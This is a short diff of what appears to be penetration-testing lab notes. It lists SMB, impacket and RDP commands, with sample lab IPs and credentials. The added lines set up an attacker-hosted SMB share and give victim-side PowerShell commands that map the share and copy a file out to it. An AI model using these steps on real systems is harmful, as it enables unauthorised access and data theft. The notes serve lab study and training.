@@ -8,6 +8,14 @@ Smbclient //192.168.211.10/Users -N
 _______________________
 SMB Server:
 impacket-smbserver files . -smb2support
+
+impacket-smbserver -smb2support files . -user kali -password mypass
+#Victim: Powershell
+net use z: \\192.168.119.174\pub /user:kali mypass
+net use z: \\192.168.119.174\pub
+cp "File name.txt" z:
+
+
 _______________________
 RDP:
 xfreerdp /v:192.168.197.196 /u:offsec /p:lab 
